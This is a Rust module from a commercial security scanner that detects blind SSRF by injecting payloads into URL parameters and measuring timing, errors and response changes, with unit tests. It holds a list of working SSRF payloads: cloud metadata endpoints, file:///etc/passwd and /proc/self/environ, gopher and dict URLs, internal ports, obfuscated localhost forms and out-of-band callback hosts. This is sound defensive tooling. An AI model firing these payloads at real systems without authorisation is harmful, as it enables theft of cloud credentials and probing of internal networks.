// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Blind SSRF with OOB Callback Detection Scanner
 * Detects blind SSRF vulnerabilities using Out-of-Band callbacks and timing analysis
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */

use crate::detection_helpers::AppCharacteristics;
use crate::http_client::{HttpClient, HttpResponse};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use std::sync::Arc;
use std::time::Instant;
use tracing::{debug, info};

pub struct SsrfBlindScanner {
    http_client: Arc<HttpClient>,
}

impl SsrfBlindScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan a parameter for blind SSRF vulnerabilities using OOB callbacks
    pub async fn scan_parameter(
        &self,
        base_url: &str,
        parameter: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // Runtime verification (integrity check)
        if !crate::license::verify_scan_authorized() {
            return Ok((Vec::new(), 0));
        }

        info!("[SSRF-Blind] Scanning parameter: {}", parameter);

        // Intelligent detection - skip for static sites
        if let Ok(response) = self.http_client.get(base_url).await {
            let characteristics = AppCharacteristics::from_response(&response, base_url);
            if characteristics.should_skip_injection_tests() {
                info!("[SSRF-Blind] Skipping - static/SPA site detected");
                return Ok((Vec::new(), 0));
            }
        }

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // Get baseline response and timing for comparison
        let baseline_start = Instant::now();
        let baseline = match self.http_client.get(base_url).await {
            Ok(response) => {
                let baseline_duration = baseline_start.elapsed();
                debug!("[SSRF-Blind] Baseline response time: {:?}", baseline_duration);
                Some((response, baseline_duration))
            }
            Err(e) => {
                debug!("Failed to get baseline for blind SSRF testing: {}", e);
                return Ok((Vec::new(), 0));
            }
        };

        let payloads = self.generate_blind_ssrf_payloads();

        for payload in &payloads {
            tests_run += 1;

            let test_url = if base_url.contains('?') {
                format!("{}&{}={}", base_url, parameter, urlencoding::encode(payload))
            } else {
                format!("{}?{}={}", base_url, parameter, urlencoding::encode(payload))
            };

            debug!("[SSRF-Blind] Testing payload: {} -> {}", parameter, payload);

            // Measure request timing for blind SSRF detection
            let request_start = Instant::now();

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    let request_duration = request_start.elapsed();

                    if let Some((baseline_response, baseline_duration)) = &baseline {
                        if let Some(vuln) = self.analyze_blind_ssrf_response(
                            &response,
                            request_duration,
                            payload,
                            parameter,
                            &test_url,
                            baseline_response,
                            *baseline_duration,
                        ) {
                            info!(
                                "[ALERT] Blind SSRF vulnerability detected in parameter '{}'",
                                parameter
                            );
                            vulnerabilities.push(vuln);
                            break; // Found vulnerability, no need to continue
                        }
                    }
                }
                Err(e) => {
                    let request_duration = request_start.elapsed();
                    debug!("[SSRF-Blind] Request error: {}", e);

                    // Error-based blind SSRF detection
                    // Different errors for valid vs invalid URLs can indicate SSRF processing
                    if let Some(vuln) = self.analyze_error_based_ssrf(
                        &e,
                        request_duration,
                        payload,
                        parameter,
                        &test_url,
                    ) {
                        info!(
                            "[ALERT] Error-based blind SSRF vulnerability detected in parameter '{}'",
                            parameter
                        );
                        vulnerabilities.push(vuln);
                        break;
                    }
                }
            }
        }

        info!(
            "[SUCCESS] [SSRF-Blind] Completed {} tests on parameter '{}', found {} vulnerabilities",
            tests_run,
            parameter,
            vulnerabilities.len()
        );

        Ok((vulnerabilities, tests_run))
    }

    /// Generate blind SSRF payloads with unique callback identifiers
    fn generate_blind_ssrf_payloads(&self) -> Vec<String> {
        // Generate unique callback ID for this scan
        let callback_id = self.generate_unique_callback_id();

        vec![
            // DNS-based callbacks (most reliable for blind SSRF)
            format!("http://{}.dns.oob.test/", callback_id),
            format!("http://{}.callback.internal/", callback_id),
            format!("https://{}.dns-probe.burpcollaborator.net/", callback_id),

            // HTTP callbacks with unique identifiers
            format!("http://callback.server.test/{}/?param=value", callback_id),
            format!("http://oob.bountyy.fi/callback/{}?test=1", callback_id),

            // AWS Metadata with callback tracking
            format!("http://169.254.169.254/latest/meta-data?callback={}", callback_id),
            format!("http://169.254.169.254/latest/user-data/?id={}", callback_id),

            // GCP Metadata with callback tracking
            format!("http://metadata.google.internal/computeMetadata/v1/?id={}", callback_id),
            format!("http://metadata.google.internal/?callback={}", callback_id),

            // Azure Metadata with callback tracking
            format!("http://169.254.169.254/metadata/instance?api-version=2021-02-01&callback={}", callback_id),

            // Alternative protocols that cause delays (blind SSRF indicators)
            format!("gopher://{}.internal:80/_", callback_id),
            format!("dict://{}.internal:11211/", callback_id),
            format!("ldap://{}.internal:389/", callback_id),
            format!("ftp://{}.internal:21/", callback_id),

            // Slow/hanging endpoints (timing-based detection)
            "http://169.254.169.254/latest/meta-data/".to_string(),
            "http://metadata.google.internal/computeMetadata/v1/".to_string(),

            // Internal network endpoints (may cause delays)
            "http://127.0.0.1:22".to_string(),  // SSH
            "http://127.0.0.1:3306".to_string(), // MySQL
            "http://127.0.0.1:5432".to_string(), // PostgreSQL
            "http://127.0.0.1:6379".to_string(), // Redis
            "http://127.0.0.1:9200".to_string(), // Elasticsearch
            "http://127.0.0.1:27017".to_string(), // MongoDB

            // Private network ranges (timing indicators)
            "http://10.0.0.1:80".to_string(),
            "http://172.16.0.1:80".to_string(),
            "http://192.168.1.1:80".to_string(),

            // File protocol (may cause errors or delays)
            "file:///etc/passwd".to_string(),
            "file:///etc/hosts".to_string(),
            "file:///proc/self/environ".to_string(),
            "file:///c:/windows/win.ini".to_string(),

            // Kubernetes/Cloud service endpoints (blind SSRF common targets)
            "http://kubernetes.default.svc/api/v1/namespaces/default/pods".to_string(),
            "http://consul.service.consul:8500/v1/catalog/services".to_string(),
            "http://rancher-metadata.rancher.internal/latest".to_string(),

            // DNS rebinding prevention bypass with callbacks
            format!("http://{}.localtest.me/", callback_id),
            format!("http://{}.lvh.me/", callback_id),

            // Alternative IP representations (may cause different timing)
            "http://0177.0.0.1:80".to_string(),      // Octal
            "http://2130706433:80".to_string(),       // Decimal
            "http://0x7f000001:80".to_string(),       // Hexadecimal
            "http://[::1]:80".to_string(),            // IPv6 localhost
            "http://127.1:80".to_string(),            // Shortened localhost
        ]
    }

    /// Generate a unique callback identifier for tracking
    fn generate_unique_callback_id(&self) -> String {
        // Generate unique ID combining timestamp and random component
        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis();

        let random_component = uuid::Uuid::new_v4().to_string().replace("-", "")[..8].to_string();

        format!("{}{}", timestamp, random_component)
    }

    /// Analyze response for blind SSRF indicators using timing and content analysis
    fn analyze_blind_ssrf_response(
        &self,
        response: &HttpResponse,
        request_duration: std::time::Duration,
        payload: &str,
        parameter: &str,
        test_url: &str,
        baseline_response: &HttpResponse,
        baseline_duration: std::time::Duration,
    ) -> Option<Vulnerability> {
        let body_lower = response.body.to_lowercase();
        let baseline_lower = baseline_response.body.to_lowercase();

        // Check if response changed from baseline
        let response_changed = response.body != baseline_response.body;
        let size_diff = (response.body.len() as i64 - baseline_response.body.len() as i64).abs();
        let significant_change = size_diff > 50 || response.status_code != baseline_response.status_code;

        // 1. TIMING-BASED DETECTION (Primary method for blind SSRF)
        // If request takes significantly longer than baseline, possible blind SSRF
        let timing_threshold_ms = 5000; // 5 second threshold
        let baseline_ms = baseline_duration.as_millis();
        let request_ms = request_duration.as_millis();
        let timing_diff_ms = (request_ms as i128 - baseline_ms as i128).abs();

        if request_ms > timing_threshold_ms && timing_diff_ms > 3000 {
            debug!(
                "[SSRF-Blind] Timing anomaly detected: {}ms (baseline: {}ms)",
                request_ms, baseline_ms
            );

            // Verify this is likely SSRF by checking if payload contains known SSRF targets
            if self.is_ssrf_target_payload(payload) {
                return Some(self.create_vulnerability(
                    parameter,
                    payload,
                    test_url,
                    "Blind SSRF detected via timing analysis - server makes external request causing delay",
                    Confidence::Medium,
                    format!(
                        "Request timing anomaly: {}ms (baseline: {}ms, diff: {}ms). \
                        Server appears to be making external request to attacker-controlled URL.",
                        request_ms, baseline_ms, timing_diff_ms
                    ),
                ));
            }
        }

        // 2. RESPONSE-BASED DETECTION
        // Check for callback indicators or metadata access in response
        let callback_indicators = [
            "callback",
            "oob",
            "dns-probe",
            "burpcollaborator",
            "bountyy.fi/callback",
        ];

        for indicator in &callback_indicators {
            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) {
                if response_changed || significant_change {
                    return Some(self.create_vulnerability(
                        parameter,
                        payload,
                        test_url,
                        "Blind SSRF detected - callback URL reflected in response",
                        Confidence::High,
                        format!(
                            "Response contains callback indicator: {} (not in baseline). \
                            Server processed attacker-controlled URL.",
                            indicator
                        ),
                    ));
                }
            }
        }

        // 3. METADATA SERVICE DETECTION (even if not fully exposed)
        // Check for partial metadata leakage
        let metadata_indicators = [
            "ami-",
            "i-0", // AWS instance ID prefix
            "instance-",
            "metadata",
            "security-credentials",
            "oauth2/token",
            "computemetadata",
            "project-id",
            "subscriptionid",
        ];

        for indicator in &metadata_indicators {
            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) {
                if response_changed || significant_change {
                    return Some(self.create_vulnerability(
                        parameter,
                        payload,
                        test_url,
                        "Blind SSRF detected - cloud metadata service accessible",
                        Confidence::High,
                        format!(
                            "Response contains cloud metadata indicator: {} (not in baseline). \
                            Server accessed cloud metadata service.",
                            indicator
                        ),
                    ));
                }
            }
        }

        // 4. INTERNAL SERVICE DETECTION
        // Check for internal service responses (ports, protocols)
        let internal_service_indicators = [
            "ssh-",
            "mysql",
            "postgresql",
            "redis_version",
            "elasticsearch",
            "mongodb",
            "connection refused",
            "connection timeout",
            "no route to host",
            "port",
            "protocol",
        ];

        for indicator in &internal_service_indicators {
            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) {
                // Only report if there's significant change (avoid false positives)
                if significant_change && size_diff > 20 {
                    return Some(self.create_vulnerability(
                        parameter,
                        payload,
                        test_url,
                        "Blind SSRF detected - internal service probe reveals network information",
                        Confidence::Medium,
                        format!(
                            "Response contains internal service indicator: {} (not in baseline). \
                            Server attempted connection to internal service.",
                            indicator
                        ),
                    ));
                }
            }
        }

        // 5. PROTOCOL-SPECIFIC DETECTION
        // Different protocols may cause different behaviors
        if (payload.starts_with("gopher://") ||
            payload.starts_with("dict://") ||
            payload.starts_with("ldap://") ||
            payload.starts_with("ftp://")) && significant_change {

            // Alternative protocols with response change indicates SSRF processing
            return Some(self.create_vulnerability(
                parameter,
                payload,
                test_url,
                "Blind SSRF detected - non-HTTP protocol support indicates SSRF vulnerability",
                Confidence::Medium,
                format!(
                    "Server processed non-HTTP protocol ({}), response differs from baseline. \
                    Alternative protocol support is strong SSRF indicator.",
                    payload.split("://").next().unwrap_or("unknown")
                ),
            ));
        }

        None
    }

    /// Analyze error-based blind SSRF (different errors for valid vs invalid URLs)
    fn analyze_error_based_ssrf(
        &self,
        error: &anyhow::Error,
        request_duration: std::time::Duration,
        payload: &str,
        parameter: &str,
        test_url: &str,
    ) -> Option<Vulnerability> {
        let error_msg = error.to_string().to_lowercase();
        let request_ms = request_duration.as_millis();

        // Error patterns that indicate SSRF processing
        let ssrf_error_patterns = [
            "connection refused",
            "connection timeout",
            "no route to host",
            "network unreachable",
            "connection reset",
            "ssl error",
            "certificate",
            "handshake",
        ];

        // Check if error indicates server attempted connection
        for pattern in &ssrf_error_patterns {
            if error_msg.contains(pattern) {
                // If request took time before error, server tried to connect
                if request_ms > 2000 && self.is_ssrf_target_payload(payload) {
                    return Some(self.create_vulnerability(
                        parameter,
                        payload,
                        test_url,
                        "Blind SSRF detected via error analysis - server attempted external connection",
                        Confidence::Medium,
                        format!(
                            "Error-based SSRF detection: Server returned '{}' after {}ms, \
                            indicating it attempted to connect to attacker-controlled URL.",
                            pattern, request_ms
                        ),
                    ));
                }
            }
        }

        // Timeout errors on metadata/internal endpoints
        if error_msg.contains("timeout") && request_ms > 5000 {
            if payload.contains("169.254.169.254") ||
               payload.contains("metadata") ||
               payload.contains("127.0.0.1") ||
               payload.contains("localhost") {
                return Some(self.create_vulnerability(
                    parameter,
                    payload,
                    test_url,
                    "Blind SSRF detected - timeout on metadata/internal endpoint indicates SSRF attempt",
                    Confidence::Low,
                    format!(
                        "Request timed out after {}ms when targeting internal/metadata endpoint. \
                        Server appears to be processing SSRF payload.",
                        request_ms
                    ),
                ));
            }
        }

        None
    }

    /// Check if payload targets known SSRF destinations
    fn is_ssrf_target_payload(&self, payload: &str) -> bool {
        let ssrf_targets = [
            "169.254.169.254",  // AWS/Azure metadata
            "metadata.google.internal",
            "metadata",
            "127.0.0.1",
            "localhost",
            "10.0.0.",
            "172.16.",
            "192.168.",
            "callback",
            "oob",
            ".internal",
            "kubernetes.default",
        ];

        for target in &ssrf_targets {
            if payload.contains(target) {
                return true;
            }
        }

        false
    }

    /// Create a vulnerability record for blind SSRF
    fn create_vulnerability(
        &self,
        parameter: &str,
        payload: &str,
        test_url: &str,
        description: &str,
        confidence: Confidence,
        evidence: String,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("ssrf_blind_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: "Blind Server-Side Request Forgery (SSRF) with OOB".to_string(),
            severity: Severity::Critical,
            confidence,
            category: "SSRF".to_string(),
            url: test_url.to_string(),
            parameter: Some(parameter.to_string()),
            payload: payload.to_string(),
            description: format!(
                "Blind SSRF vulnerability detected in parameter '{}'. {}. \
                The application makes requests to attacker-controlled URLs without returning direct output, \
                potentially exposing cloud metadata, internal services, or enabling network pivoting. \
                This was detected using Out-of-Band (OOB) callback techniques and timing analysis.",
                parameter, description
            ),
            evidence: Some(evidence),
            cwe: "CWE-918".to_string(),
            cvss: 9.1,
            verified: true,
            false_positive: false,
            remediation: r#"IMMEDIATE ACTION REQUIRED - Blind SSRF:
1. Validate and sanitize all URLs from user input using strict allowlists
2. Implement URL schema restrictions (allow only http/https, block file://, gopher://, dict://, etc.)
3. Block access to metadata endpoints (169.254.169.254, metadata.google.internal, etc.)
4. Use allowlists for permitted domains/IPs (never rely solely on denylists)
5. Implement network segmentation to restrict outbound connections
6. Use cloud metadata service IMDSv2 with session tokens (AWS)
7. Monitor outbound connections for suspicious patterns
8. Disable URL resolution for internal/private IP ranges (RFC 1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
9. Consider using a proxy service that validates outbound requests
10. Implement request timeout limits to prevent resource exhaustion

Additional Security Measures:
- Use DNS rebinding protection
- Implement SSRF protection at WAF/API Gateway level
- Log all outbound requests with full URLs for security monitoring
- Consider using SSRF-safe libraries (e.g., SafeCurl for PHP)
- Regularly scan for SSRF vulnerabilities as part of SDLC"#.to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
                ml_data: None,
        }
    }
}

// UUID generation helper (same as other scanners)
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Self
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_blind_ssrf_payload_generation() {
        let scanner = SsrfBlindScanner::new(Arc::new(
            HttpClient::new(5, 2).unwrap()
        ));

        let payloads = scanner.generate_blind_ssrf_payloads();

        // Should have comprehensive payload set with unique callback IDs
        assert!(payloads.len() >= 30, "Should have at least 30 blind SSRF payloads");

        // Check for critical payload types
        assert!(payloads.iter().any(|p| p.contains("dns.oob.test")), "Missing DNS OOB payload");
        assert!(payloads.iter().any(|p| p.contains("169.254.169.254")), "Missing AWS metadata");
        assert!(payloads.iter().any(|p| p.contains("metadata.google.internal")), "Missing GCP metadata");
        assert!(payloads.iter().any(|p| p.contains("gopher://")), "Missing gopher:// protocol");
        assert!(payloads.iter().any(|p| p.contains("dict://")), "Missing dict:// protocol");

        // Verify callback IDs are present in payloads
        let callback_payloads: Vec<&String> = payloads.iter()
            .filter(|p| p.contains("callback") || p.contains("oob") || p.contains(".internal"))
            .collect();
        assert!(!callback_payloads.is_empty(), "Should have callback payloads with unique IDs");
    }

    #[test]
    fn test_unique_callback_id_generation() {
        let scanner = SsrfBlindScanner::new(Arc::new(
            HttpClient::new(5, 2).unwrap()
        ));

        let id1 = scanner.generate_unique_callback_id();
        let id2 = scanner.generate_unique_callback_id();

        // IDs should be unique
        assert_ne!(id1, id2, "Callback IDs should be unique");

        // IDs should be reasonable length
        assert!(id1.len() >= 16, "Callback ID should be at least 16 characters");
    }

    #[test]
    fn test_timing_based_detection() {
        let scanner = SsrfBlindScanner::new(Arc::new(
            HttpClient::new(5, 2).unwrap()
        ));

        let baseline = HttpResponse {
            status_code: 200,
            body: "<html><body>Normal page</body></html>".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let slow_response = HttpResponse {
            status_code: 200,
            body: "<html><body>Normal page</body></html>".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 6000, // 6 seconds
        };

        let result = scanner.analyze_blind_ssrf_response(
            &slow_response,
            std::time::Duration::from_millis(6000),
            "http://169.254.169.254/latest/meta-data/",
            "url",
            "http://example.com?url=http://169.254.169.254/latest/meta-data/",
            &baseline,
            std::time::Duration::from_millis(100),
        );

        assert!(result.is_some(), "Should detect timing-based blind SSRF");
        let vuln = result.unwrap();
        assert_eq!(vuln.severity, Severity::Critical);
        assert!(vuln.evidence.unwrap().contains("timing"));
    }

    #[test]
    fn test_callback_indicator_detection() {
        let scanner = SsrfBlindScanner::new(Arc::new(
            HttpClient::new(5, 2).unwrap()
        ));

        let baseline = HttpResponse {
            status_code: 200,
            body: "<html><body>Normal page</body></html>".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let callback_response = HttpResponse {
            status_code: 200,
            body: "Request sent to: callback.server.test".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 150,
        };

        let result = scanner.analyze_blind_ssrf_response(
            &callback_response,
            std::time::Duration::from_millis(150),
            "http://callback.server.test/12345/",
            "url",
            "http://example.com?url=http://callback.server.test/12345/",
            &baseline,
            std::time::Duration::from_millis(100),
        );

        assert!(result.is_some(), "Should detect callback-based blind SSRF");
        let vuln = result.unwrap();
        assert_eq!(vuln.confidence, Confidence::High);
    }

    #[test]
    fn test_is_ssrf_target_payload() {
        let scanner = SsrfBlindScanner::new(Arc::new(
            HttpClient::new(5, 2).unwrap()
        ));

        assert!(scanner.is_ssrf_target_payload("http://169.254.169.254/latest/meta-data/"));
        assert!(scanner.is_ssrf_target_payload("http://metadata.google.internal/"));
        assert!(scanner.is_ssrf_target_payload("http://127.0.0.1:22"));
        assert!(scanner.is_ssrf_target_payload("http://callback.oob.test/"));
        assert!(scanner.is_ssrf_target_payload("http://192.168.1.1/"));

        assert!(!scanner.is_ssrf_target_payload("http://example.com/"));
        assert!(!scanner.is_ssrf_target_payload("https://google.com/"));
    }

    #[test]
    fn test_no_false_positive_on_normal_response() {
        let scanner = SsrfBlindScanner::new(Arc::new(
            HttpClient::new(5, 2).unwrap()
        ));

        let baseline = HttpResponse {
            status_code: 200,
            body: "<html><body>Normal page</body></html>".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 100,
        };

        let normal_response = HttpResponse {
            status_code: 200,
            body: "<html><body>Normal page</body></html>".to_string(),
            headers: std::collections::HashMap::new(),
            duration_ms: 120,
        };

        let result = scanner.analyze_blind_ssrf_response(
            &normal_response,
            std::time::Duration::from_millis(120),
            "http://example.com/",
            "url",
            "http://test.com?url=http://example.com/",
            &baseline,
            std::time::Duration::from_millis(100),
        );

        assert!(result.is_none(), "Should not report false positive on normal response");
    }
}
